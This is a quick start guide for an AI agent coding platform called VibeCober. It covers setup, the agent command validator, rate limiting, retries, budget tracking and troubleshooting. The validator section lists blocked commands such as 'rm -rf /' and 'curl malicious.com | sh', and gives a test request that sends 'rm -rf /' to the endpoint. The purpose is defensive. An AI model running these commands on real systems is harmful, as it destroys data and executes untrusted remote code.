# VibeCober - Quick Start Guide

## 🚀 Installation (5 Minutes)

### 1. Clone & Install
```bash
# Install backend
cd backend
pip install -r requirements.txt

# Install frontend
cd frontend
npm install
```

### 2. Configure Environment
```bash
# Copy example env file
cp .env.example .env

# Edit .env and set required variables:
# - DATABASE_URL (or use default SQLite)
# - JWT_SECRET_KEY (generate a strong secret)
# - ANTHROPIC_API_KEY (for agent chat)
# - NIM_API_KEY (for main LLM pipeline)
```

### 3. Initialize Database
```bash
cd backend
python migrate_db.py
```

### 4. Start Development Servers
```bash
# Terminal 1: Backend
cd backend
uvicorn backend.main:app --reload --host 127.0.0.1 --port 8000

# Terminal 2: Frontend
cd frontend
npm run dev
```

**Access**: http://localhost:5173

---

## 🔐 New Security Features

### 1. Agent Chat (Backend Proxy)
**Before**: API key exposed in frontend ❌
**After**: Secure backend endpoint ✅

```typescript
// OLD (INSECURE):
const client = new Anthropic({ apiKey: "sk-..." }); // Exposed!

// NEW (SECURE):
const response = await fetch("/api/agent-chat/chat", {
  method: "POST",
  body: JSON.stringify({
    agent_name: "mike",
    messages: [...],
    system_prompt: "...",
    can_use_tools: true
  })
});
```

### 2. Command Validation
**Protected Commands**: Agents can only run safe commands

```bash
# ALLOWED:
npm install
git status
python main.py
docker ps

# BLOCKED (403 Forbidden):
rm -rf /
sudo systemctl restart
curl malicious.com | sh
eval "malicious code"
```

**Test It**:
```bash
curl -X POST http://localhost:8000/studio/execute \
  -H "Content-Type: application/json" \
  -d '{"project_id": "test", "command": "rm -rf /"}'

# Response: 403 Forbidden
# { "detail": "Command blocked for security: Command contains dangerous pattern: rm\\s+-rf" }
```

### 3. Rate Limiting
**Limits**:
- Global: 100 requests/minute
- Agent Chat: 20/minute
- Command Execution: 30/minute

**Test It**:
```bash
# Hit rate limit:
for i in {1..25}; do curl http://localhost:8000/api/status; done

# After 20 requests:
# Response: 429 Too Many Requests
```

---

## 🛡️ Reliability Features

### 1. LLM Retry Logic
All LLM calls automatically retry on failure:
- **Timeout**: 30 seconds
- **Retries**: 3 attempts
- **Backoff**: 1s, 2s, 4s (max 60s)

### 2. Database Retry
Database connection retries automatically:
- **Retries**: 3 attempts
- **Backoff**: 2s, 4s, 8s

### 3. Tool Call Limits
Agents limited to 10 tool calls per run to prevent infinite loops.

---

## 💰 Budget Tracking

### Decimal Precision
All budget calculations use Decimal for perfect accuracy:

```python
from backend.engine.token_ledger import ledger

ledger.set_budget(1.00)  # $1.00 max
ledger.record("planner", input_tokens=500, output_tokens=1000, cost=0.015)

print(ledger.total_cost)      # Decimal('0.015000')
print(ledger.budget_remaining) # Decimal('0.985000')
```

**No more floating point errors!** ✅

---

## 📝 Logging

### Development
```
2026-02-15 10:30:45 [INFO] vibecober: Server starting on http://127.0.0.1:8000
2026-02-15 10:30:46 [INFO] database: Database connected successfully on attempt 1
```

### Production (Set `ENV=production`)
```json
{"timestamp": "2026-02-15T10:30:45Z", "level": "INFO", "logger": "vibecober", "message": "Server starting", "port": 8000}
{"timestamp": "2026-02-15T10:30:46Z", "level": "INFO", "logger": "database", "message": "Database connected", "attempt": 1}
```

**Usage**:
```python
from backend.utils import get_logger

logger = get_logger(__name__)
logger.info("User logged in", user_id=123, ip="192.168.1.1")
logger.error("Payment failed", order_id=456, error="Card declined")
```

---

## 🧪 Testing Checklist

### Security Tests
- [ ] Command injection blocked
- [ ] Rate limiting works
- [ ] API key not in frontend code
- [ ] CORS whitelist configured
- [ ] Markdown sanitized (no XSS)

### Reliability Tests
- [ ] LLM retries on timeout
- [ ] Database reconnects
- [ ] Tool calls limited to 10
- [ ] Backoff capped at 60s

### Budget Tests
- [ ] Decimal precision (no 0.29999999)
- [ ] Budget enforcement works
- [ ] Governance tracks daily spend

---

## 🔧 Common Utilities

### JSON Parser
```python
from backend.utils import extract_json_from_text, safe_json_dumps

# Extract JSON from LLM response
text = "Sure! Here's the JSON: ```json\n{\"name\": \"test\"}\n```"
data = extract_json_from_text(text)  # {"name": "test"}

# Safe serialization
json_str = safe_json_dumps({"complex": object})  # Never throws
```

### Path Utils
```python
from backend.utils import normalize_path, safe_join, is_safe_path

# Normalize paths
path = normalize_path("/workspace/src/main.py")  # "src/main.py"

# Safe joining (prevents directory traversal)
path = safe_join("uploads", user_input)  # Throws if "../" detected

# Validate path
is_safe_path("../etc/passwd", "/app/workspace")  # False
```

### Error Formatter
```python
from backend.utils import format_error, format_api_error

# Format exceptions
try:
    raise ValueError("Invalid input")
except Exception as e:
    error = format_error(e, context="user_registration")
    # {"error": "ValueError", "message": "Invalid input", "context": "user_registration"}

# API errors
error = format_api_error(404, "User not found", user_id=123)
# {"status_code": 404, "detail": "User not found", "user_id": 123}
```

---

## 🚨 Troubleshooting

### "Database connection failed"
```bash
# Check DATABASE_URL
echo $DATABASE_URL

# Test connection
python -c "from backend.database import engine; engine.connect()"

# Check migrations
cd backend && python migrate_db.py
```

### "ANTHROPIC_API_KEY not configured"
```bash
# Backend needs this for agent chat proxy
echo "ANTHROPIC_API_KEY=sk-ant-..." >> .env

# Restart backend server
```

### "Rate limit exceeded"
```bash
# Wait 1 minute or increase limits in main.py:
# limiter = Limiter(default_limits=["200/minute", "2000/hour"])
```

### "Command blocked for security"
```bash
# Check allowed commands:
python -c "from backend.utils import get_safe_command_help; print(get_safe_command_help())"

# Add to allowlist in backend/utils/command_validator.py if needed
```

---

## 📚 Next Steps

1. **Read**: [IMPLEMENTATION_SUMMARY.md](IMPLEMENTATION_SUMMARY.md) for full details
2. **Review**: [CLAUDE.md](CLAUDE.md) for project architecture
3. **Test**: Run security and reliability tests above
4. **Deploy**: Follow production checklist in IMPLEMENTATION_SUMMARY.md

---

## ✅ Production Checklist

Before deploying to production:

- [ ] Set `ENV=production`
- [ ] Set strong `JWT_SECRET_KEY`
- [ ] Configure `CORS_ORIGINS` (no wildcards)
- [ ] Set `DATABASE_URL` to PostgreSQL
- [ ] Configure `ANTHROPIC_API_KEY` (backend)
- [ ] Configure `NIM_API_KEY` (main pipeline)
- [ ] Run `python migrate_db.py`
- [ ] Test all security features
- [ ] Review rate limits
- [ ] Enable structured logging
- [ ] Set up monitoring/alerts

---

**Questions?** Check [IMPLEMENTATION_SUMMARY.md](IMPLEMENTATION_SUMMARY.md) or review the code!

*Last Updated: 2026-02-15 | VibeCober v0.7.0*
